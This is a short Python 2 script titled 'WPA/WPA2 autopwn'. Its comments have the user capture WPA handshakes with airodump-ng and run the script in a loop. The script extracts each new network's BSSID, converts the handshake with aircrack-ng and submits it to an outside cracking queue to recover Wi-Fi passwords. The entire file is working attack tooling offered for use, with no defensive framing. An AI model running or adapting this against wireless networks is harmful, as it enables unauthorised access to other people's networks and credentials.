#!/usr/bin/env python
#
# WPA/WPA2 autopwn
# Vitaly Nikolenko
# vnik at hashcrack.org
#
# 1. Run airodump to capture WPA/WPA2 handshakes, e.g.:
#    # airodump-ng -w /tmp/out --output-format pcap mon0
#
# 2. Setup a cron job or a simple loop to periodically run wpa_autopwn.py:
#    # while :; do ./wpa_autopwn.py /tmp/out.cap; sleep 300; done

from pcappy import PcapPyOffline, open_offline
from sys import argv
import struct
import pdb
import subprocess
import os
import glob
import sqlite3

AIRCRACK_BIN='/usr/bin/aircrack-ng'
WPACLEAN_BIN='/usr/bin/wpaclean'
CRACKQ_CLI='/usr/local/bin/crackqcli.py'

cursor = None
db = None

def connect_db(init):
    global cursor
    global db

    db = sqlite3.connect(os.getenv('HOME') + '/.wpa_pwn.sqlite3')
    cursor = db.cursor()

    if init:
        # this will create the db file if it doesn't exist
        cursor.execute('''CREATE TABLE entries(id INTEGER PRIMARY KEY, bssid TEXT unique)''')

if not argv[1:]:
    print 'usage: %s [in1.cap] [in2.cap] ...' % argv[0]
    exit(-1)

f = open(os.devnull, 'w')

s = subprocess.call([WPACLEAN_BIN, '/tmp/cleaned.cap'] + glob.glob(' '.join(argv[1:])), stdout=f, stderr=f) 

if os.stat('/tmp/cleaned.cap').st_size == 24:
    print '[-] No WPA/WPA2 handshakes captured...'
    exit(-1)

p = open_offline(argv[1])


# filter beacons
p.filter = 'link[0] == 0x80'

def gotpacket(d, hdr, data):
    bssid = struct.unpack('6B', data[10:16])
    bssid_str = ':'.join(format(x, '02x') for x in bssid)
    d.append(bssid_str)

bssid_list = []

# Parameters are count, callback, user params
p.loop(-1, gotpacket, bssid_list)

if not os.path.isfile(os.getenv('HOME') + '/.wpa_pwn.sqlite3'):
    connect_db(True)
else:
    connect_db(False)

for bssid in bssid_list:
    cursor.execute('SELECT id FROM entries WHERE bssid = ?', bssid)
    if cursor.fetchone() is None:
        # this is a new bssid
        print '[+] Using bssid = %s' % bssid
        s = subprocess.call([AIRCRACK_BIN, '-J', '/tmp/'+bssid, '-b', bssid, '/tmp/cleaned.cap'], stdout=f, stderr=f) 

        # send it to the crackq
        s = subprocess.call([CRACKQ_CLI, '-t', 'wpa', '/tmp/'+bssid+'.hccap']) 

        cursor.execute('INSERT INTO entries(bssid) VALUES (?)', (bssid))
        db.commit()
    else:
        print '[-] Already tried this bssid...'

f.close()
